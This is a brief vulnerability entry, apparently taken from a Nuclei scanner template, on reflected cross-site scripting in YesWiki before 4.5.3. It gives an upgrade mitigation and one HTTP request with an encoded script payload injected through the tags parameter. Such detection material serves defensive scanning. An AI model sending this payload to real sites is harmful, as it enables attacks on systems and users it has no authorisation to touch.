# Vulnerability: YesWiki - Cross-Site Scripting
**Classification:** XSS
**Source:** Nuclei Template (`yeswiki-reflected-xss.yaml`)

## Description
YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.

## Secure Mitigation
Upgrade to YesWiki version 4.6.0 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

